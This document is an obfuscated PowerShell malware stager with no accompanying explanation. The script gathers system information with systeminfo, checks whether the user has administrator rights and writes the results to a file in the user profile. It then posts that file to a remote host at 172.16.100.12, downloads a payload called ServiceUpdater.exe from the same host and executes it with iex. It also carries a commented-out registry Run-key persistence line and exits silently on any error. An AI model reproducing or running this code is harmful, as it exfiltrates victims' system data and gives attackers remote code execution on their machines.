$KGtu1  =  [TYpE]("{7}{8}{6}{9}{0}{3}{2}{4}{1}{5}" -f 'Y.p','nT','NCiPAl.wIndOWS','RI','idE','ItY','e','SY','STEM.S','cUrIT')  ;   SET-ITEM  ("vaRiABl"+"e:8"+"4R"+"Bua") ([TYPe]("{6}{7}{2}{3}{5}{0}{1}{4}" -f 'WsBUil','t','pR','inCipal','InROLE','.WiNdO','S','eCUrITy.'))  ;    Sv  ('hN'+'B2')  ( [type]("{3}{0}{1}{2}"-F 'viRoN','m','ENT','EN') ) ;    sET fzuk  ( [TYPe]("{1}{0}{2}"-f 'In','str','G') )  ;${Re`MotE`ip} = ("{1}{2}{0}"-f '100.12','172.16','.')
${remO`Te`PorT} = 80
${oU`TP`Ut} = ((("{3}{4}{5}{2}{1}{0}"-f'txt','nfo.','rcimi','C:','UsershgrPublich','g'))-crEPlacE  'hgr',[CHAr]92)
${sY`sINf`ova`Rs} = @(("{1}{0}{2}" -f 'st','Ho',' Name'), ("{1}{0}" -f ' Name','OS'), ("{0}{2}{1}"-f 'OS Ver','on','si'), ("{5}{1}{4}{0}{3}{2}"-f'igurat',' C','on','i','onf','OS'), ("{0}{2}{1}{3}" -f'System','Typ',' ','e'), ("{1}{2}{4}{3}{0}"-f'er','Re','g','red Own','iste'), ("{1}{0}{2}" -f'OS Ver','BI','sion'), ("{2}{1}{0}" -f'in','ma','Do'), ("{1}{2}{0}" -f 'er','Logon ','Serv'))

try {
    ${sYs`i`NfO} = .("{0}{1}{2}" -f 'syst','e','minfo')
    ${r`e`SUlTS} = @()
    foreach (${f`IelD} in ${S`ysi`NfOvA`RS}) {
        ${r`E`sUlTs} += (${Sysi`N`FO} | &("{1}{2}{0}"-f 't-String','Sel','ec') ${fI`E`ld}).ToString()
    }
    ${CUr`RE`NtuSER} =  (vaRiablE ('k'+'GTU1') -vaLuE )::GetCurrent()
    ${rEs`UL`Ts} += ${C`UrR`eNtuSer}
    ${I`SADM`IN} = (.("{2}{1}{3}{0}" -f't','w-Obje','Ne','c') ("{3}{0}{5}{1}{6}{4}{2}" -f 'ty.Pri','ipal.Wind','rincipal','Securi','wsP','nc','o')(${C`URR`eNT`USER})).IsInRole(  (gEt-vaRiABlE  ("84R"+"BUa")  -vALu  )::Administrator)
    ${r`ES`UlTs} += "Is Admin     : ${isAdmin}"

    ${HOmEd`IR} =  ( dir ('vAr'+'IABl'+'E:'+'hNB2') ).vALuE::GetFolderPath(("{1}{0}{2}"-f 'erProfil','Us','e'))
    ${Ou`Tp`Ut} = &("{1}{0}" -f '-Path','Join') ${ho`me`diR} ("{0}{2}{1}"-f'c','minfo.txt','i')
    ${d`IR} = .("{0}{2}{1}" -f 'Sp','ath','lit-P') ${ou`Tp`UT}
    if (-not (&("{1}{2}{0}"-f 'th','Te','st-Pa') ${D`iR})) {
    	.("{0}{1}"-f'New-I','tem') -Path ${d`ir} -ItemType ("{1}{2}{0}" -f 'ory','Dir','ect') -Force | &("{1}{0}"-f 'Null','Out-')
    }
    ${re`S`ULts} | .("{1}{0}{2}" -f'ut-F','O','ile') -FilePath ${oUT`p`UT} -Encoding ("{0}{1}"-f 'UTF','8')
    ${Re`Sp} = &("{0}{4}{3}{1}{5}{2}" -f'I','e','t','-WebRequ','nvoke','s') -Uri "${remoteIp}:${remotePort}" -Method ("{1}{0}" -f'OST','P') -InFile ${Ou`TP`UT} -UseBasicParsing
    ${paYloA`d`Id} = ${r`esP}.Content.Trim()
    if (  (  VArIABLE FzUK  -vAlUeOnly  )::IsNullOrEmpty(${pAyL`oad`Id})) {
        exit 0 
    }
    ${x} = (.("{2}{1}{3}{0}"-f '-Object','e','N','w') ("{4}{3}{0}{2}{1}"-f'.WebC','ent','li','et','N')).DownloadString("http://${remoteIp}:80/ServiceUpdater.exe")
    #Set-ItemProperty -Path "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ServiceUpdater" -Value $x -Type String
    .("{0}{1}"-f'ie','x') ${X}
} catch {
    exit 0
}

